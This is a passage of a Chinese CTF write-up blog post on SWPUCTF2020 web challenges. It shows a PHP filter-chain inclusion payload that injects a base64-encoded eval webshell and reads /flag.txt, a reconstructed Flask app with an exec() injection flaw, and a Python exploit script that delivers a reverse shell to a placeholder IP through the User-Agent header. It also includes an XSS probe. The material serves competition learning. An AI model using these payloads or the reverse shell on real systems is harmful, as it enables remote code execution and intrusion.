+<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">:%</span><span class="mi">252</span><span class="nx">f</span><span class="o">/</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">index</span><span class="o">.</span><span class="nx">action</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>在<code>contact.action</code>源码中找到一个GET表单，它获得输入后直接将输入值插入html表单而不做任何处理，只有一个html实体化，这样的话我们就可以通过编码绕过然后包含执行。</p>
+<pre><code>http://47.116.79.40:32773/php:%252f/filter/convert.iconv.utf-8.utf-7/convert.base64-decode/resource=http:%252f/localhost/contact.action%3fname=xxPD9waHAgZXZhbCgkX0dFVFt0eXNraWxsMTFdKTs/Pg%23.action?tyskill11=phpinfo();
+</code></pre><p>关键词搜索flag，找到</p>
+<blockquote>
+<p>open_basedir: /var/www/html/f83b25c297736f9df64b448d0cfe9c70:/flag.txt</p>
+</blockquote>
+<p>读flag，payload</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">php</span><span class="o">:%</span><span class="mi">252</span><span class="nx">f</span><span class="o">/</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8.</span><span class="nx">utf</span><span class="o">-</span><span class="mi">7</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">http</span><span class="o">:%</span><span class="mi">252</span><span class="nx">f</span><span class="o">/</span><span class="nx">localhost</span><span class="o">/</span><span class="nx">contact</span><span class="o">.</span><span class="nx">action</span><span class="o">%</span><span class="mi">3</span><span class="nx">fname</span><span class="o">=</span><span class="nx">xxPD9waHAgZXZhbCgkX0dFVFt0eXNdKTs</span><span class="o">/</span><span class="nx">Pg</span><span class="o">%</span><span class="mf">23.</span><span class="nx">action</span><span class="o">?</span><span class="nx">tys</span><span class="o">=</span><span class="nx">show_source</span><span class="p">(</span><span class="s2">&#34;/flag.txt&#34;</span><span class="p">);</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>由于表单不支持POST，所以这里也许无法达成后门。</p>
+<h2 id="noobpy"><a href="#noobpy" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:noobpy" class="headings">noobpy</a></h2>
+<blockquote>
+<p>hint1: 尝试弄出错误页面，上面有东西
+hint2: User-Agent</p>
+</blockquote>
+<p>传数组出现debug界面，然后各种尝试大概复原源码就差不多了。</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#coding=utf-8</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">render_template</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">send_from_directory</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="n">whitelist</span> <span class="o">=</span> <span class="s1">&#39;.0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz&#39;</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">Hello</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/equ.php&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">Equ</span><span class="p">():</span>
+    <span class="n">left</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;left&#39;</span><span class="p">]</span>
+    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">left</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">ch</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">whitelist</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;equ.html&#34;</span><span class="p">,</span><span class="n">equation</span><span class="o">=</span><span class="s2">&#34;I&#39;m&#34;</span><span class="p">,</span><span class="n">result</span><span class="o">=</span><span class="s1">&#39;莫的感情的bot&#39;</span><span class="p">)</span>
+    <span class="n">right</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;right&#39;</span><span class="p">]</span>
+    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">right</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">ch</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">whitelist</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;equ.html&#34;</span><span class="p">,</span><span class="n">equation</span><span class="o">=</span><span class="s2">&#34;I&#39;m&#34;</span><span class="p">,</span><span class="n">result</span><span class="o">=</span><span class="s1">&#39;莫的感情的bot&#39;</span><span class="p">)</span>
+	<span class="n">equstr</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="s2">&#34;=&#34;</span> <span class="o">+</span><span class="n">right</span>
+    <span class="k">exec</span><span class="p">(</span><span class="s2">&#34;res=&#34;</span><span class="o">+</span><span class="n">left</span><span class="o">+</span><span class="s2">&#34;==&#34;</span><span class="o">+</span><span class="n">right</span><span class="p">)</span>
+    <span class="n">result</span><span class="o">=</span> <span class="nb">locals</span><span class="p">()[</span><span class="s1">&#39;res&#39;</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;equ.html&#34;</span><span class="p">,</span><span class="n">equation</span><span class="o">=</span><span class="n">equstr</span><span class="p">,</span><span class="n">result</span><span class="o">=</span><span class="n">result</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/robots.txt&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">static_from_root</span><span class="p">():</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>额，也不知道<code>robots.txt</code>的<code>/source.tar</code>是不是烟雾弹，访问返回404。。。</p>
+<p>不管他，反正源码收集的差不多了，<code>exec(&quot;res=&quot;+left+&quot;==&quot;+right)</code>存在命令注入，使用 ; 作为命令分隔符执行命令。由于禁用了<code>()</code>，所以似乎没办法逃逸。同时也只导入了request，也没办法使用flask的内置函数逃逸，似乎除了官方的就没办法了(我太菜了)。</p>
+<p>那就分析一下官方的payload：</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">left</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="o">=</span><span class="n">__builtins__</span><span class="o">.</span><span class="k">exec</span><span class="p">;</span><span class="n">request</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">user_agent</span><span class="o">.</span><span class="n">string</span><span class="p">];</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">right</span><span class="o">=</span><span class="mi">1</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>1=1都看得懂，主要还是前面payload的构造。</p>
+<p>这里是通过 = 获得模块<code>__builtins__</code>，同理我们可以导入<code>__import__</code>，但是白名单中并没有引号，所以也没办法直接命令执行。接下来就是从<code>__builtins__</code>获得exec函数命令执行。此时request重载为<code>&lt;built-in function exec&gt;</code>，直接<code>request[request.user_agent.string]</code>执行UA头内容命令执行。</p>
+<p>exp</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="kn">as</span> <span class="nn">req</span>
+<span class="n">url</span> <span class="o">=</span><span class="s2">&#34;http://noobpy.fkeuyri4yr34.das.wetolink.com:82/equ.php&#34;</span>
+<span class="n">session</span><span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">poc1</span><span class="p">,</span><span class="n">poc2</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&#34;left&#34;</span><span class="p">:</span> <span class="n">poc1</span> <span class="o">+</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+        <span class="s2">&#34;right&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span>
+    <span class="p">}</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="n">poc2</span>
+    <span class="p">}</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+<span class="c1">#exp(&#39;__builtins__.eval=__builtins__.exec#&#39;,&#34;xxx&#34;)</span>
+<span class="n">exp</span><span class="p">(</span><span class="s2">&#34;request.__class__.__getitem__=__builtins__.exec;request[request.user_agent.string];&#34;</span><span class="p">,</span><span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;IP&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span><span class="p">)</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h2 id="simple-injection"><a href="#simple-injection" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:simple-injection" class="headings">simple injection</a></h2>
+<p>一开始以为是注入，结果F12里面<code>action=&quot;&quot;</code>透露着一丝诡异的气息，不是注入，那就扫！</p>
+<p>访问<code>/phpmyadmin</code>，尝试一波弱口令，没试出来，不会了。。。</p>
+<h2 id="太极"><a href="#太极" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:太极" class="headings">太极</a></h2>
+<p>开局一个注册框，随便注册一个<code>1&lt;??&gt;1</code>，登陆进去发现用户名直接插入到html文本中。退出重新注册<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现可以弹窗，存在XSS，但是PHPSESSID设置了HttpOnly属性，我们无法通过js脚本获取admin的cookie。</p>
+<p>咕咕咕</p>
+<p><strong>重来</strong>题目的环境都关了，就不复现了。</p>
+<h2 id="参考"><a href="#参考" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:参考" class="headings">参考</a></h2>
+<p><a href="https://wllm1013.github.io/2020/12/09/SWPUCTF2020-%E5%AE%98%E6%96%B9WP/#Web" target="_blank" rel="noopener">SWPUCTF2020 官方WP</a></p>
+
+            </div>
+
+            
+    
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://tyskill.github.io" class="p-author h-card" target="_blank" rel="noopener">tyskill</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/posts/swpu2020/" target="_blank" rel="noopener">https://tyskill.github.io/posts/swpu2020/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
+    
+
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/posts/unctf2020/" class="related-link">UNCTF2020记录+复现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/dfjk2020%E9%83%A8%E5%88%86wp/" class="related-link">巅峰极客2020部分wp</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/nctf2020/" class="related-link">NCTF2020记录+复现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/n1ctf2020/" class="related-link">N1CTF2020赛后复现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/posts/ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF/" class="related-link">CTFshow-月饼杯</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+    
+        <div class="post-tags">
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/php/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>php</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>SQL注入</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/python/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>python</a>
+                
+            
+                
+                
+                
+                
+                    
+                    <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>命令注入</a>
+                
+            
+        </div>
+    
+
+
+
+        
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+                <li class="post-nav-prev">
+                    <a href="/posts/flaskssti/" rel="prev">&lt; Flask模板注入小结</a>
+                </li>
+            
+            
+                <li class="post-nav-next">
+                    <a href="/posts/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next">CTFshow-文件上传 &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            <div class="site-info">©&nbsp;2020–2021&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;tyskill</div><div class="powered-by">Powered by <a href="https://github.com/gohugoio/hugo" target="_blank" rel="noopener">Hugo</a> | Theme is <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a></div><div class="custom-footer">地不长无名之草，天不生无用之人</div>
+                <div class="busuanzi-site-uv-and-pv">
+                    <span id="busuanzi_container_site_uv">本站访客数&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon busuanzi-site-uv"><path d="M224 256c70.7 0 128-57.3 128-128S294.7 0 224 0 96 57.3 96 128s57.3 128 128 128zm89.6 32h-16.7c-22.2 10.2-46.9 16-72.9 16s-50.6-5.8-72.9-16h-16.7C60.2 288 0 348.2 0 422.4V464c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48v-41.6c0-74.2-60.2-134.4-134.4-134.4z"/></svg>&nbsp;<span id="busuanzi_value_site_uv"></span></span>&nbsp;|&nbsp;<span id="busuanzi_container_site_pv">本站访问量&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" class="icon busuanzi-site-pv"><path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"/></svg>&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+                </div>
+
+            
+
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.css" integrity="sha256-gPJfuwTULrEAAcI3X4bALVU/2qBU+QY/TpoD3GO+Exw=" crossorigin="anonymous">
+<script>
+    if (typeof renderMathInElement === 'undefined') {
+        var getScript = (options) => {
+            var script = document.createElement('script');
+            script.defer = true;
+            script.crossOrigin = 'anonymous';
+            Object.keys(options).forEach((key) => {
+                script[key] = options[key];
+            });
+            document.body.appendChild(script);
+        };
+        getScript({
+            src: 'https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/katex.min.js',
+            integrity: 'sha256-YTW9cMncW/ZQMhY69KaUxIa2cPTxV87Uh627Gf5ODUw=',
+            onload: () => {
+                getScript({
+                    src: 'https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/mhchem.min.js',
+                    integrity: 'sha256-yzSfYeVsWJ1x+2g8CYHsB/Mn7PcSp8122k5BM4T3Vxw=',
+                    onload: () => {
+                        getScript({
+                            src: 'https://cdn.jsdelivr.net/npm/katex@0.13.0/dist/contrib/auto-render.min.js',
+                            integrity: 'sha256-fxJzNV6hpc8tgW8tF0zVobKa71eTCRGTgxFXt1ZpJNM=',
+                            onload: () => {
+                                renderKaTex();
+                            }
+                        });
+                    }
+                });
+            }
+        });
+    } else {
+        renderKaTex();
+    }
+    function renderKaTex() {
+        renderMathInElement(
+            document.body,
+            {
+                delimiters: [
+                    {left: "$$", right: "$$", display: true},
+                    {left: "\\[", right: "\\]", display: true},
+                    {left: "$", right: "$", display: false},
+                    {left: "\\(", right: "\\)", display: false}
+                ]
+            }
+        );
+    }
+</script>
+
+
+
+
+
+
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
